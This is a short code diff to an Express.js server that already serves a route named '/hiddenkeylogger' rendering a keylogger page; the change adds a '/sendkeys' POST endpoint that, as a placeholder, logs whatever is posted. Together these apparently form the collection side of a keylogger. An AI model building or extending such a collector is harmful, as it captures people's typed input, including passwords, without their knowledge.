@@ -13,6 +13,11 @@ app.get("/hiddenkeylogger", (req, res) => {
     res.render("keylogger.pug");
 });
 
+app.post("/sendkeys", (req, res) => {
+    // Placeholder for post mapping.
+    console.log(req.body);
+});
+
 app.listen(8080, () => {
     console.log("server started");
 })
